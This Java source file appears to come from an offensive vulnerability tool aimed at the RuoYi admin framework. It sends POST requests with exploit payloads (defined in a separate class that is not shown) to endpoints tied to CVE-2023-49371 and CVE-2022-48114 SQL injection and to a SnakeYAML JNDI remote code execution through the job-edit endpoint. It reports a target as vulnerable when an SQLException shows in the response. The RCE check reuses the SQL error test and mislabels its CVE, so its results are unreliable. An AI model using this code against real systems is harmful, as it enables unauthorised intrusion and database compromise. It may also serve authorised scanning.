package com.liev.clouds.exp;

import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.payload.RuoYiPayload;
import com.liev.clouds.utils.HttpUtils;
import com.liev.clouds.webcontroller.framework.RuoYiController;

import java.util.Map;

/**
 * @author Revcloud
 * @since 2024/8/29 9:59
 */
public class RuoYiExp {


    /**
     * CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入
     *
     * @param url
     * @param headers
     * @return
     */
    public static void sql_system_role_list(String url, Map<String, String> headers) {
        boolean is = false;

        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            String urlTrue = url + "/system/role/list";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.SQL_system_role_list, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                RuoYiController.log.appendText("[+++]CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入漏洞存在！【√】");
                RuoYiController.responseBody.appendText(responseBody);
                // TODO 其它判断
                is = true;
            }
        } catch (Exception e) {
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    public static void sql_system_dept_edit(String url, Map<String, String> headers){
        boolean is = false;

        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/system/dept/edit";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.SQL_system_dept_edit, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                RuoYiController.log.appendText("[+++]CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入漏洞存在！【√】");
                RuoYiController.responseBody.appendText(responseBody);
                // TODO 其它判断
                is = true;
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    /**
     * CVE-2022-48114 RuoYi 小于 4.7.5 SQL注入
     * @param url
     * @param headers
     */
    public static void sql_tool_gen_createTable(String url, Map<String, String> headers){
        boolean is = false;

        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/tool/gen/creatTable";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.SQL_tool_gen_createTable, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                RuoYiController.log.appendText("[+++]CVE-2022-48114 RuoYi 小于 4.7.5 SQL注入漏洞存在！【√】");
                RuoYiController.responseBody.appendText(responseBody);
                // TODO 其它判断
                is = true;
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    public static void rce_Jndi_snakeyaml(String url, Map<String, String> headers){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/monitor/job/edit";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.RCE_snakeyaml, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                RuoYiController.log.appendText("[+++]CVE-2022-48114 RuoYi 等于 4.7.2 定时任务RCE漏洞存在！【√】");
                RuoYiController.responseBody.appendText(responseBody);
                // TODO 其它判断
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

}
